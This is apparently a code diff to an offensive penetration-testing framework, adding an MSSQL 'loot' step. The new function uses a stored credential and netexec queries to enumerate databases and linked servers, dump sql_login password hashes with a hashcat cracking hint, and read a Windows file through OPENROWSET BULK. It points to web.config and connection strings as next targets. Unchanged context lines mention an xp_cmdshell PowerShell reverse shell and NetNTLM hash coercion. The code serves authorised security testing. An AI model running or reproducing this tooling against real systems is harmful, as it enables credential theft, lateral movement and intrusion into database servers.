@@ -2290,6 +2290,27 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"telnet foothold — {mm.group(1).strip()}"[:140]}
         return None
 
+    # 2bq) mssql-loot: sql_login hashes / linked servers / file-read > db inventory
+    if sid == "mssql-loot":
+        hashes = re.findall(r"^✗ HASH ", output, re.M)
+        linked = re.findall(r"^✗ LINKED (\S+)", output, re.M)
+        fread = re.search(r"^✗ FILE-READ ", output, re.M)
+        dbs = re.findall(r"^· DB ", output, re.M)
+        bits = []
+        if hashes:
+            bits.append(f"{len(hashes)} sql_login hash(es)")
+        if linked:
+            bits.append(f"linked: {', '.join(linked[:3])}")
+        if fread:
+            bits.append("OPENROWSET file-read")
+        if bits:
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"MSSQL loot: {'; '.join(bits)}"[:140]}
+        if dbs:
+            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
+                    "summary": f"MSSQL: {len(dbs)} non-system database(s)"[:140]}
+        return None
+
     # 2bp) mssql-shell: a PowerShell reverse shell was fired through xp_cmdshell
     if sid == "mssql-shell":
         if "shell → " in output:
@@ -3426,9 +3447,8 @@ _EXPLOIT_STEPS = {
         ("Banner: SQL Browser (1434) / TDS pre-login → version + instance", "mssql-banner"),
         ("sa blank/default + reused creds (netexec mssql); flags sysadmin", "mssql-creds"),
         ("xp_cmdshell command execution (sysadmin) → foothold", "mssql-exec"),
-        "Enumerate linked servers; EXECUTE AS / trustworthy DB for privilege abuse",
+        ("Loot: DBs, linked servers, sql_login hashes, OPENROWSET file-read", "mssql-loot"),
         "Coerce the service account's NetNTLM hash (xp_dirtree / xp_fileexist) → crack / relay",
-        "Read/write files (OPENROWSET / bulk); loot connection strings",
         "Manual steps & further research",
     ],
     "psql": [
@@ -13521,6 +13541,77 @@ def _tool_mssql_shell(ip: str, port: int, proto: str) -> str:
     return f"mssql-shell: shell → {user}@{ip}:{lport}"
 
 
+# ── MSSQL step 4: loot — databases, linked servers, sql_login hashes, OPENROWSET ──
+_MSSQL_SYSDB = ("master", "tempdb", "model", "msdb")
+
+
+def _mssql_q(ip: str, port: int, user: str, pw: str, sql: str, timeout: int = 45) -> tuple:
+    """Run a SQL query via netexec mssql -q. Returns (rc, ansi-stripped output) or (None, '')."""
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        return (None, "")
+    try:
+        p = subprocess.run([nxc, "mssql", ip, "--port", str(port), "-u", user, "-p", pw,
+                            "--local-auth", "-q", sql], capture_output=True, text=True, timeout=timeout)
+        return (p.returncode, re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or "")))
+    except (OSError, subprocess.SubprocessError):
+        return (None, "")
+
+
+def _tool_mssql_loot(ip: str, port: int, proto: str) -> str:
+    """MSSQL step 4 tool: with a valid cred, enumerate databases, linked servers (lateral / privesc
+    via EXECUTE AT), dump sql_login password hashes (→ crack), and read a file with OPENROWSET BULK
+    to confirm file-read. Read-only queries via netexec mssql -q. No stored cred / no netexec →
+    raises. Authorised targets only."""
+    if not (shutil.which("netexec") or shutil.which("nxc")):
+        raise RuntimeError("netexec (nxc) required for MSSQL loot (queries)")
+    creds = _gather_mssql_creds(ip)
+    if not creds:
+        raise RuntimeError("no MSSQL creds — run mssql-creds (r2) first")
+    user, pw = creds[0]
+
+    def q(sql):
+        return _mssql_q(ip, port, user, pw, sql)
+
+    rc, ctx = q("SELECT SYSTEM_USER+'|'+CONVERT(varchar,IS_SRVROLEMEMBER('sysadmin'))")
+    if rc is None:
+        raise RuntimeError(f"{ip}:{port} — netexec mssql did not run (down / wrong port?)")
+    mc = re.search(r"(\S+)\|([01])", _nxc_body(ctx))
+    whoami, sysadmin = (mc.group(1), mc.group(2) == "1") if mc else (user, False)
+
+    def toks(sql):
+        body = _nxc_body(q(sql)[1])
+        return [ln.strip() for ln in body.splitlines()
+                if ln.strip() and ln.strip().lower() != "name" and " " not in ln.strip()]
+
+    userdbs = [d for d in toks("SELECT name FROM sys.databases") if d not in _MSSQL_SYSDB]
+    linked = toks("SELECT name FROM sys.servers WHERE server_id<>0")
+
+    _rc, hout = q("SELECT name+'|'+CONVERT(NVARCHAR(MAX),password_hash,1) "
+                  "FROM sys.sql_logins WHERE password_hash IS NOT NULL")
+    hashes = re.findall(r"(\S+)\|(0x0100[0-9A-Fa-f]+)", _nxc_body(hout))
+
+    _rc, fout = q("SELECT CAST(x.BulkColumn AS VARCHAR(300)) "
+                  "FROM OPENROWSET(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) x")
+    fbody = _nxc_body(fout)
+    fileread = re.search(r"(?i)\[fonts\]|\[extensions\]|for 16-bit", fbody)
+
+    lines = [f"[*] as {whoami} · sysadmin: {'yes' if sysadmin else 'no'}"]
+    for login, h in hashes[:20]:
+        lines.append(f"✗ HASH {login} {h[:50]}  (sys.sql_logins — crack: hashcat -m 1731)")
+    for srv in linked[:15]:
+        lines.append(f"✗ LINKED {srv}  (EXECUTE AT / OPENQUERY → lateral / privesc)")
+    if fileread:
+        snip = fbody.strip().splitlines()[0][:60] if fbody.strip() else "win.ini"
+        lines.append(f"✗ FILE-READ C:\\Windows\\win.ini — {snip}")
+        lines.append("· OPENROWSET BULK read works → loot web.config / connection strings / configs")
+    for d in userdbs[:20]:
+        lines.append(f"· DB {d}")
+    if not hashes and not linked and not fileread and not userdbs:
+        lines.append("· nothing enumerable with this cred — try a sysadmin login (mssql-creds r2)")
+    return f"MSSQL loot — {ip}:{port}\n\n" + "\n".join(lines)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -13676,6 +13767,7 @@ _STEP_TOOLS = {
     "mssql-creds": ("sa blank/default + reused creds (netexec mssql, flags sysadmin)", _tool_mssql_creds),
     "mssql-exec": ("xp_cmdshell command exec confirm (netexec -x, sysadmin)", _tool_mssql_exec),
     "mssql-shell": ("MSSQL foothold → xp_cmdshell PowerShell reverse shell (spawned)", _tool_mssql_shell),
+    "mssql-loot": ("DBs, linked servers, sql_login hashes, OPENROWSET file-read (netexec -q)", _tool_mssql_loot),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -13768,6 +13860,7 @@ _STEP_TOOL_RUNS = {
     "mssql-creds":      ("netexec mssql", f"{_mins(_MSSQLCREDS_DEADLINE)} min"),
     "mssql-exec":       ("netexec mssql -x", None),
     "mssql-shell":      ("netexec + nc listener", None),
+    "mssql-loot":       ("netexec mssql -q", None),
     "spawn-shell":      ("router → service foothold", None),
 }
 
